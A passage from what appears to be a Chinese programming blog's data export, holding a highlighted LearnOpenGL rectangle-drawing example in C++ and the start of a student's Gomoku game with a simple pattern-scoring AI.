<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> SCR_WIDTH = <span class=\"number\">800</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> SCR_HEIGHT = <span class=\"number\">600</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">char</span>* vertexShaderSource = <span class=\"string\">&quot;#version 460 core\\n&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;layout (location = 0) in vec3 aPos;\\n&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;void main()\\n&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;&#123;\\n&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;   gl_Position = vec4(aPos.x, aPos.y, aPos.z, 1.0);\\n&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;&#125;\\0&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">char</span>* fragmentShaderSource = <span class=\"string\">&quot;#version 460 core\\n&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;out vec4 FragColor;\\n&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;void main()\\n&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;&#123;\\n&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;   FragColor = vec4(1.0f, 0.5f, 0.2f, 1.0f);\\n&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;&#125;\\n\\0&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// glfw: 初始化和配置</span></span><br><span class=\"line\">    <span class=\"comment\">// ------------------------------</span></span><br><span class=\"line\">    glfwInit();</span><br><span class=\"line\">    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, <span class=\"number\">4</span>);</span><br><span class=\"line\">    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, <span class=\"number\">6</span>);</span><br><span class=\"line\">    glfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// glfw: Mac OS X 系统需配置以下代码</span></span><br><span class=\"line\">    <span class=\"comment\">// ------------------------------</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> __APPLE__</span></span><br><span class=\"line\">    glfwWindowHint(GLFW_OPENGL_FORWARD_COMPAT, GL_TRUE);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// glfw 窗口创建</span></span><br><span class=\"line\">    <span class=\"comment\">// --------------------</span></span><br><span class=\"line\">    GLFWwindow* window = glfwCreateWindow(SCR_WIDTH, SCR_HEIGHT, <span class=\"string\">&quot;LearnOpenGL&quot;</span>, <span class=\"literal\">NULL</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (window == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;Failed to create GLFW window&quot;</span> &lt;&lt; <span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">        glfwTerminate();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    glfwMakeContextCurrent(window);</span><br><span class=\"line\">    glfwSetFramebufferSizeCallback(window, framebuffer_size_callback);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// glad: 初始化Glad，加载所有OpenGL函数指针</span></span><br><span class=\"line\">    <span class=\"comment\">// ---------------------------------------</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!gladLoadGLLoader((GLADloadproc)glfwGetProcAddress))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;Failed to initialize GLAD&quot;</span> &lt;&lt; <span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 构建着色器</span></span><br><span class=\"line\">    <span class=\"comment\">// ------------------------------------</span></span><br><span class=\"line\">    <span class=\"comment\">// 顶点着色器</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> vertexShader = glCreateShader(GL_VERTEX_SHADER);</span><br><span class=\"line\">    glShaderSource(vertexShader, <span class=\"number\">1</span>, &amp;vertexShaderSource, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">    glCompileShader(vertexShader);</span><br><span class=\"line\">    <span class=\"comment\">// 检查着色器编译错误</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> success;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> infoLog[<span class=\"number\">512</span>];</span><br><span class=\"line\">    glGetShaderiv(vertexShader, GL_COMPILE_STATUS, &amp;success);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!success)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        glGetShaderInfoLog(vertexShader, <span class=\"number\">512</span>, <span class=\"literal\">NULL</span>, infoLog);</span><br><span class=\"line\">        <span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;ERROR::SHADER::VERTEX::COMPILATION_FAILED\\n&quot;</span> &lt;&lt; infoLog &lt;&lt; <span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 片段着色器</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> fragmentShader = glCreateShader(GL_FRAGMENT_SHADER);</span><br><span class=\"line\">    glShaderSource(fragmentShader, <span class=\"number\">1</span>, &amp;fragmentShaderSource, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">    glCompileShader(fragmentShader);</span><br><span class=\"line\">    <span class=\"comment\">// 检查片段着色器编译错误</span></span><br><span class=\"line\">    glGetShaderiv(fragmentShader, GL_COMPILE_STATUS, &amp;success);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!success)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        glGetShaderInfoLog(fragmentShader, <span class=\"number\">512</span>, <span class=\"literal\">NULL</span>, infoLog);</span><br><span class=\"line\">        <span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;ERROR::SHADER::FRAGMENT::COMPILATION_FAILED\\n&quot;</span> &lt;&lt; infoLog &lt;&lt; <span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 连接着色器</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> shaderProgram = glCreateProgram();</span><br><span class=\"line\">    glAttachShader(shaderProgram, vertexShader);</span><br><span class=\"line\">    glAttachShader(shaderProgram, fragmentShader);</span><br><span class=\"line\">    glLinkProgram(shaderProgram);</span><br><span class=\"line\">    <span class=\"comment\">// 检查连接错误</span></span><br><span class=\"line\">    glGetProgramiv(shaderProgram, GL_LINK_STATUS, &amp;success);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!success) &#123;</span><br><span class=\"line\">        glGetProgramInfoLog(shaderProgram, <span class=\"number\">512</span>, <span class=\"literal\">NULL</span>, infoLog);</span><br><span class=\"line\">        <span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;ERROR::SHADER::PROGRAM::LINKING_FAILED\\n&quot;</span> &lt;&lt; infoLog &lt;&lt; <span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    glDeleteShader(vertexShader);</span><br><span class=\"line\">    glDeleteShader(fragmentShader);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 设置顶点数据（和缓冲区）并配置顶点属性。</span></span><br><span class=\"line\">    <span class=\"comment\">// ------------------------------------------------------------------</span></span><br><span class=\"line\">    <span class=\"keyword\">float</span> vertices[] = &#123;</span><br><span class=\"line\">        <span class=\"number\">0.5f</span>, <span class=\"number\">0.5f</span>, <span class=\"number\">0.0f</span>,   <span class=\"comment\">// 右上角</span></span><br><span class=\"line\">        <span class=\"number\">0.5f</span>, <span class=\"number\">-0.5f</span>, <span class=\"number\">0.0f</span>,  <span class=\"comment\">// 右下角</span></span><br><span class=\"line\">        <span class=\"number\">-0.5f</span>, <span class=\"number\">-0.5f</span>, <span class=\"number\">0.0f</span>, <span class=\"comment\">// 左下角</span></span><br><span class=\"line\">        <span class=\"number\">-0.5f</span>, <span class=\"number\">0.5f</span>, <span class=\"number\">0.0f</span>   <span class=\"comment\">// 左上角</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> indices[] = &#123; <span class=\"comment\">// 注意索引从0开始! </span></span><br><span class=\"line\">        <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">3</span>, <span class=\"comment\">// 第一个三角形</span></span><br><span class=\"line\">        <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>  <span class=\"comment\">// 第二个三角形</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> VAO, VBO, EBO;</span><br><span class=\"line\">    glGenVertexArrays(<span class=\"number\">1</span>, &amp;VAO);</span><br><span class=\"line\">    glGenBuffers(<span class=\"number\">1</span>, &amp;VBO);</span><br><span class=\"line\">    glGenBuffers(<span class=\"number\">1</span>, &amp;EBO);</span><br><span class=\"line\">    <span class=\"comment\">// 首先绑定顶点数组对象（VAO），然后绑定并设置顶点缓冲区，然后配置顶点属性。</span></span><br><span class=\"line\">    glBindVertexArray(VAO);</span><br><span class=\"line\"></span><br><span class=\"line\">    glBindBuffer(GL_ARRAY_BUFFER, VBO);</span><br><span class=\"line\">    glBufferData(GL_ARRAY_BUFFER, <span class=\"keyword\">sizeof</span>(vertices), vertices, GL_STATIC_DRAW);</span><br><span class=\"line\"></span><br><span class=\"line\">    glBindBuffer(GL_ELEMENT_ARRAY_BUFFER, EBO);</span><br><span class=\"line\">    glBufferData(GL_ELEMENT_ARRAY_BUFFER, <span class=\"keyword\">sizeof</span>(vertices), indices, GL_STATIC_DRAW);</span><br><span class=\"line\"></span><br><span class=\"line\">    glVertexAttribPointer(<span class=\"number\">0</span>, <span class=\"number\">3</span>, GL_FLOAT, GL_FALSE, <span class=\"number\">3</span> * <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">float</span>), (<span class=\"keyword\">void</span>*)<span class=\"number\">0</span>);</span><br><span class=\"line\">    glEnableVertexAttribArray(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 请注意，对glVertexAttribPointer的调用将VBO注册为顶点属性的绑定顶点缓冲区对象是允许的。</span></span><br><span class=\"line\">    <span class=\"comment\">// 因此之后我们可以安全地解除绑定。</span></span><br><span class=\"line\">    glBindBuffer(GL_ARRAY_BUFFER, <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 之后可以取消绑定VAO，这样其他VAO调用就不会意外修改此VAO，但这很少发生。</span></span><br><span class=\"line\">    <span class=\"comment\">// 无论如何，修改其他VAO都需要调用glBindVertexArray，因此通常在不直接需要时，我们不会取消绑定VAO（或VBO）。</span></span><br><span class=\"line\">    glBindVertexArray(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 取消注释此调用以绘制线框多边形。</span></span><br><span class=\"line\">    <span class=\"comment\">//glPolygonMode(GL_FRONT_AND_BACK, GL_LINE);</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 渲染循环中</span></span><br><span class=\"line\">    <span class=\"comment\">// -----------</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (!glfwWindowShouldClose(window))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 输入</span></span><br><span class=\"line\">        <span class=\"comment\">// -----</span></span><br><span class=\"line\">        processInput(window);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 渲染</span></span><br><span class=\"line\">        <span class=\"comment\">// ------</span></span><br><span class=\"line\">        glClearColor(<span class=\"number\">0.2f</span>, <span class=\"number\">0.3f</span>, <span class=\"number\">0.3f</span>, <span class=\"number\">1.0f</span>);</span><br><span class=\"line\">        glClear(GL_COLOR_BUFFER_BIT);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 画图</span></span><br><span class=\"line\">        glUseProgram(shaderProgram);</span><br><span class=\"line\">        <span class=\"comment\">// 因为只有一个VAO，因此不必每次都绑定它，但是我们这样做是为了使事情更有条理。</span></span><br><span class=\"line\">        glBindVertexArray(VAO);</span><br><span class=\"line\">        glDrawElements(GL_TRIANGLES, <span class=\"number\">6</span>, GL_UNSIGNED_INT,<span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"comment\">// glBindVertexArray(0); // 无需每次都解除绑定。</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// glfw: 交换缓冲区，轮询IO事件（按下/释放，鼠标移动）。</span></span><br><span class=\"line\">        <span class=\"comment\">// -------------------------------------------------------------------------------</span></span><br><span class=\"line\">        glfwSwapBuffers(window);</span><br><span class=\"line\">        glfwPollEvents();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 可选: 一旦超出其目标，则取消分配所有资源。</span></span><br><span class=\"line\">    <span class=\"comment\">// ------------------------------------------------------------------------</span></span><br><span class=\"line\">    glDeleteVertexArrays(<span class=\"number\">1</span>, &amp;VAO);</span><br><span class=\"line\">    glDeleteBuffers(<span class=\"number\">1</span>, &amp;VBO);</span><br><span class=\"line\">    glDeleteBuffers(<span class=\"number\">1</span>, &amp;EBO);</span><br><span class=\"line\">    glDeleteProgram(shaderProgram);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// glfw: 终止并清除所有先前分配的GLFW资源。</span></span><br><span class=\"line\">    <span class=\"comment\">// ------------------------------------------------------------------</span></span><br><span class=\"line\">    glfwTerminate();</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 处理所有输: 查询GLFW是否在此框架中 按下/释放 了相关按键并作出相应反应。</span></span><br><span class=\"line\"><span class=\"comment\">// ---------------------------------------------------------------------------------------------------------</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">processInput</span><span class=\"params\">(GLFWwindow* window)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 当按下Esc时，窗口关闭。</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (glfwGetKey(window, GLFW_KEY_ESCAPE) == GLFW_PRESS)</span><br><span class=\"line\">        glfwSetWindowShouldClose(window, <span class=\"literal\">true</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// glfw: 当改变窗口大小时，该回调函数被执行。</span></span><br><span class=\"line\"><span class=\"comment\">// ---------------------------------------------------------------------------------------------</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">framebuffer_size_callback</span><span class=\"params\">(GLFWwindow* window, <span class=\"keyword\">int</span> width, <span class=\"keyword\">int</span> height)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 确保视口与新窗口维度相匹配，注意宽高将明显大于视网膜显示屏的宽高。</span></span><br><span class=\"line\">    glViewport(<span class=\"number\">0</span>, <span class=\"number\">0</span>, width, height);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"五子棋","date":"2020-04-08T08:08:24.000Z","mathjax":true,"abbrlink":"fc33752b","_content":"> C++课程设计作业，包含人工智障$AI$\n\n<!--more-->\n```cpp\n#include<graphics.h>\nint pos[20][20];//\t1●\t\t-1○\t\t0×\nint black[20][20], white[20][20];\nint dir[4][2] = { {-1,-1},{-1,0},{-1,1},{0,-1} };\nbool key;\nvoid End(int n)\n{\n\tsetfont(80, 0, \"宋体\");\n\tif (n == 1)xyprintf(240, 245, \"黑方获胜\");\n\telse xyprintf(240, 245, \"白方获胜\");\n\treturn;\n}\nbool Checker()\n{\n\tsetcolor(EGERGB(255, 0, 0));\n\tfor (int i = 1; i < 12; i++)\n\t{\n\t\tfor (int j = 1; j < 12; j++)\n\t\t{\n\t\t\tif (pos[i][j])\n\t\t\t{\n\t\t\t\tbool flag = true;\n\t\t\t\tfor (int p = 0; p < 5; p++)\n\t\t\t\t\tif (pos[i][j] != pos[i][j + p])\n\t\t\t\t\t{\n\t\t\t\t\t\tflag = false;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\tif (flag)\n\t\t\t\t{\n\t\t\t\t\tline(i * 40 + 80, j * 40, i * 40 + 80, (j + 4) * 40);\n\t\t\t\t\tEnd(pos[i][j]);\n\t\t\t\t\treturn true;\n\t\t\t\t}\n\t\t\t\tflag = true;\n\t\t\t\tfor (int p = 0; p < 5; p++)\n\t\t\t\t\tif (pos[i][j] != pos[i + p][j + p])\n\t\t\t\t\t{\n\t\t\t\t\t\tflag = false;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\tif (flag)\n\t\t\t\t{\n\t\t\t\t\tline(i * 40 + 80, j * 40, (i + 4) * 40 + 80, (j + 4) * 40);\n\t\t\t\t\tEnd(pos[i][j]);\n\t\t\t\t\treturn true;\n\t\t\t\t}\n\t\t\t\tflag = true;\n\t\t\t\tfor (int p = 0; p < 5; p++)\n\t\t\t\t\tif (pos[i][j] != pos[i + p][j])\n\t\t\t\t\t{\n\t\t\t\t\t\tflag = false;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\tif (flag)\n\t\t\t\t{\n\t\t\t\t\tline(i * 40 + 80, j * 40, (i + 4) * 40 + 80, j * 40);\n\t\t\t\t\tEnd(pos[i][j]);\n\t\t\t\t\treturn true;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\tfor (int i = 5; i <= 15; i++)\n\t{\n\t\tfor (int j = 1; j < 12; j++)\n\t\t{\n\t\t\tif (pos[i][j])\n\t\t\t{\n\t\t\t\tbool flag = true;\n\t\t\t\tfor (int p = 0; p < 5; p++)\n\t\t\t\t\tif (pos[i][j] != pos[i - p][j + p])\n\t\t\t\t\t{\n\t\t\t\t\t\tflag = false;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\tif (flag)\n\t\t\t\t{\n\t\t\t\t\tline(i * 40 + 80, j * 40, (i - 4) * 40 + 80, (j + 4) * 40);\n\t\t\t\t\tEnd(pos[i][j]);\n\t\t\t\t\treturn true;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\treturn false;\n}\nvoid ChessBoard()\n{\n\tsetbkcolor(EGERGB(199, 156, 124));\n\tsetcolor(EGERGB(0, 0, 0));\n\tfor (int i = 120; i <= 680; i += 40)\n\t{\n\t\tline(120, i - 80, 680, i - 80);\t//X\t120-680\n\t\tline(i, 40, i, 600);\t\t\t//Y\t40-600\n\t}\n\tsetfillcolor(EGERGB(0, 0, 0));\n\tbar(240 - 4, 160 - 4, 240 + 4, 160 + 4);\n\tbar(240 - 4, 480 - 4, 240 + 4, 480 + 4);\n\tbar(560 - 4, 160 - 4, 560 + 4, 160 + 4);\n\tbar(560 - 4, 480 - 4, 560 + 4, 480 + 4);\n\tbar(400 - 4, 320 - 4, 400 + 4, 320 + 4);\n\tsetfont(10, 0, \"黑体\");\n\tfor (int i = 40; i <= 600; i += 40)\n\t{\n\t\txyprintf(100, i - 3, \"%d\", (int)(i / 40));\n\t\txyprintf(i + 78, 20, \"%c\", (char)(i / 40 + 'A' - 1));\n\t}\n\tsetcolor(EGERGB(255, 0, 0));\n\tsetfont(20, 0, \"宋体\");\n\txyprintf(10, 40, \"当前子数\");\n\tsetcolor(EGERGB(0, 0, 0));\n\txyprintf(10, 70, \"黑: 0\");\n\tsetcolor(EGERGB(255, 255, 255));\n\txyprintf(10, 100, \"白: 0\");\n\treturn;\n}\nvoid Chess(int x, int y, int color)\n{\n\tif (color % 2)\n\t{\n\t\tsetcolor(EGERGB(255, 255, 255));\n\t\tsetfillcolor(EGERGB(255, 255, 255));\n\t\tfillellipse(x, y, 15, 15);\n\t}\n\telse\n\t{\n\t\tsetcolor(EGERGB(0, 0, 0));\n\t\tsetfillcolor(EGERGB(0, 0, 0));\n\t\tfillellipse(x, y, 15, 15);\n\t}\n}\nbool Play(int x, int y, int color)//color: 0●  1○\n{\n\tx -= 2;\n\tif (x >= 1 && x <= 15 && y >= 1 && y <= 15)\n\t{\n\t\tif (!pos[x][y])\n\t\t{\n\t\t\tChess(x * 40 + 80, y * 40, color);\n\t\t\tif (color)pos[x][y] = -1;\n\t\t\telse pos[x][y] = 1;\n\t\t\treturn true;\n\t\t}\n\t}\n\treturn false;\n}\nvoid Counter(int n)\n{\n\tsetfillcolor(EGERGB(199, 156, 124));\n\tbar(50, 60, 70, 120);\n\tif (n % 2)\n\t{\n\t\tsetcolor(EGERGB(0, 0, 0));\n\t\txyprintf(50, 70, \"%d\", (n + 1) / 2);\n\t\tsetcolor(EGERGB(255, 255, 255));\n\t\txyprintf(50, 100, \"%d\", n / 2);\n\t\tbar(0, 140, 100, 180);\n\t\txyprintf(10, 150, \"白方执棋\");\n\t}\n\telse\n\t{\n\t\tsetcolor(EGERGB(0, 0, 0));\n\t\txyprintf(50, 70, \"%d\", n / 2);\n\t\tsetcolor(EGERGB(255, 255, 255));\n\t\txyprintf(50, 100, \"%d\", (n + 1) / 2);\n\t\tbar(0, 140, 100, 180);\n\t\tsetcolor(EGERGB(0, 0, 0));\n\t\txyprintf(10, 150, \"黑方执棋\");\n\t}\n}\nbool lian5(int x, int y)\n{\n\tfor (int i = 0; i < 4; i++)\n\t{\n\t\tint ans = 0, flag1 = 0, flag2 = 0;\n\t\tfor (int j = 1; j < 5; j++)\n\t\t{\n\t\t\tif (!flag1 && (x + j * dir[i][0] > 0) && (x + j * dir[i][0] < 16) && (y + j * dir[i][1] > 0) && (y + j * dir[i][1] < 16))\n\t\t\t{\n\t\t\t\tif (pos[x][y] == pos[x + j * dir[i][0]][y + j * dir[i][1]])\n\t\t\t\t\tans++;\n\t\t\t\telse flag1 = 1;\n\t\t\t}\n\t\t\tif (!flag2 && (x - j * dir[i][0] > 0) && (x - j * dir[i][0] < 16) && (y - j * dir[i][1] > 0) && (y - j * dir[i][1] < 16))\n\t\t\t{\n\t\t\t\tif (pos[x][y] == pos[x - j * dir[i][0]][y - j * dir[i][1]])\n\t\t\t\t\tans++;\n\t\t\t\telse flag2 = 1;\n\t\t\t}\n\t\t}\n\t\tif (ans >= 4)\n\t\t{\n\t\t\tif (pos[x][y] == 1)black[x][y] += 100;\n\t\t\telse white[x][y] += 100;\n\t\t\treturn true;\n\t\t}\n\t}\n\treturn false;\n}\nbool live4(int x, int y)\n{\n\tfor (int i = 0; i < 4; i++)\n\t{\n\t\tint ans = 0, a = 1, b = 1, flag1 = 0, flag2 = 0;\n\t\tfor (int j = 1; j < 5; j++)\n\t\t{\n\t\t\tif (!flag1 && (x + j * dir[i][0] > 0) && (x + j * dir[i][0] < 16) && (y + j * dir[i][1] > 0) && (y + j * dir[i][1] < 16))\n\t\t\t{\n\t\t\t\tif (pos[x][y] == pos[x + j * dir[i][0]][y + j * dir[i][1]])\n\t\t\t\t\tans++;\n\t\t\t\telse if (pos[x + j * dir[i][0]][y + j * dir[i][1]] == 0)\n\t\t\t\t\ta = 0, flag1 = 1;\n\t\t\t}\n\t\t\tif (!flag2 && (x - j * dir[i][0] > 0) && (x - j * dir[i][0] < 16) && (y - j * dir[i][1] > 0) && (y - j * dir[i][1] < 16))\n\t\t\t{\n\t\t\t\tif (pos[x][y] == pos[x - j * dir[i][0]][y - j * dir[i][1]])\n\t\t\t\t\tans++;\n\t\t\t\telse if (pos[x - j * dir[i][0]][y - j * dir[i][1]] == 0)\n\t\t\t\t\tb = 0, flag2 = 1;\n\t\t\t}\n\t\t}\n\t\tif ((ans >= 3) && !a && !b)\n\t\t{\n\t\t\tif (pos[x][y] == 1)black[x][y] += 80;\n\t\t\telse white[x][y] += 80;\n\t\t\treturn true;\n\t\t}\n\t}\n\treturn false;\n}\nbool chong4(int x, int y)\n{\n\tfor (int i = 0; i < 4; i++)\n\t{\n\t\tint ans = 0, a = 1, b = 1, flag1 = 0, flag2 = 0;\n\t\tfor (int j = 1; j < 5; j++)\n\t\t{\n\t\t\tif (!flag1 && (x + j * dir[i][0] > 0) && (x + j * dir[i][0] < 16) && (y + j * dir[i][1] > 0) && (y + j * dir[i][1] < 16))\n\t\t\t{\n\t\t\t\tif (pos[x][y] == pos[x + j * dir[i][0]][y + j * dir[i][1]])\n\t\t\t\t\tans++;\n\t\t\t\telse if (pos[x + j * dir[i][0]][y + j * dir[i][1]] == 0)\n\t\t\t\t\ta = 0, flag1 = 1;\n\t\t\t}\n\t\t\tif (!flag2 && (x - j * dir[i][0] > 0) && (x - j * dir[i][0] < 16) && (y - j * dir[i][1] > 0) && (y - j * dir[i][1] < 16))\n\t\t\t{\n\t\t\t\tif (pos[x][y] == pos[x - j * dir[i][0]][y - j * dir[i][1]])\n\t\t\t\t\tans++;\n\t\t\t\telse if (pos[x - j * dir[i][0]][y - j * dir[i][1]] == 0)\n\t\t\t\t\tb = 0, flag2 = 1;\n\t\t\t}\n\t\t}\n\t\tif ((ans >= 3) && (a || b) && (a != b))\n\t\t{\n\t\t\tif (pos[x][y] == 1)black[x][y] += 60;\n\t\t\telse white[x][y] += 60;\n\t\t\treturn true;\n\t\t}\n\t}\n\treturn false;\n}\nbool live3(int x, int y)\n{\n\tfor (int i = 0; i < 4; i++)\n\t{\n\t\tint ans = 0, a = 1, b = 1, flag1 = 0, flag2 = 0;\n\t\tfor (int j = 1; j < 4; j++)\n\t\t{\n\t\t\tif (!flag1 && (x + j * dir[i][0] > 0) && (x + j * dir[i][0] < 16) && (y + j * dir[i][1] > 0) && (y + j * dir[i][1] < 16))\n\t\t\t{\n\t\t\t\tif (pos[x][y] == pos[x + j * dir[i][0]][y + j * dir[i][1]])\n\t\t\t\t\tans++;\n\t\t\t\telse if (pos[x + j * dir[i][0]][y + j * dir[i][1]] == 0)\n\t\t\t\t\ta = 0, flag1 = 1;\n\t\t\t}\n\t\t\tif (!flag2 && (x - j * dir[i][0] > 0) && (x - j * dir[i][0] < 16) && (y - j * dir[i][1] > 0) && (y - j * dir[i][1] < 16))\n\t\t\t{\n\t\t\t\tif (pos[x][y] == pos[x - j * dir[i][0]][y - j * dir[i][1]])\n\t\t\t\t\tans++;\n\t\t\t\telse if (pos[x - j * dir[i][0]][y - j * dir[i][1]] == 0)\n\t\t\t\t\tb = 0, flag2 = 1;\n\t\t\t}\n\t\t}\n\t\tif ((ans >= 2) && !a && !b)\n\t\t{\n\t\t\tif (pos[x][y] == 1)black[x][y] += 70;\n\t\t\telse white[x][y] += 70;\n\t\t\treturn true;\n\t\t}\n\t}\n\treturn false;\n}\nbool death3(int x, int y)\n{\n\tfor (int i = 0; i < 4; i++)\n\t{\n\t\tint ans = 0, a = 1, b = 1, flag1 = 0, flag2 = 0;\n\t\tfor (int j = 1; j < 4; j++)\n\t\t{\n\t\t\tif (!flag1 && (x + j * dir[i][0] > 0) && (x + j * dir[i][0] < 16) && (y + j * dir[i][1] > 0) && (y + j * dir[i][1] < 16))\n\t\t\t{\n\t\t\t\tif (pos[x][y] == pos[x + j * dir[i][0]][y + j * dir[i][1]])\n\t\t\t\t\tans++;\n\t\t\t\telse if (pos[x + j * dir[i][0]][y + j * dir[i][1]] == 0)\n\t\t\t\t\ta = 0, flag1 = 1;\n\t\t\t}\n\t\t\tif (!flag2 && (x - j * dir[i][0] > 0) && (x - j * dir[i][0] < 16) && (y - j * dir[i][1] > 0) && (y - j * dir[i][1] < 16))\n\t\t\t{\n\t\t\t\tif (pos[x][y] == pos[x - j * dir[i][0]][y - j * dir[i][1]])\n\t\t\t\t\tans++;\n\t\t\t\telse if (pos[x - j * dir[i][0]][y - j * dir[i][1]] == 0)\n\t\t\t\t\tb = 0, flag2 = 1;\n\t\t\t}\n\t\t}\n\t\tif ((ans >= 2) && (a || b) && (a != b))\n\t\t{\n\t\t\tif (pos[x][y] == 1)black[x][y] += 50;\n\t\t\telse white[x][y] += 50;\n\t\t\treturn true;\n\t\t}\n\t}\n\treturn false;\n}\nbool live2(int x, int y)\n{\n\tfor (int i = 0; i < 4; i++)\n\t{\n\t\tint ans = 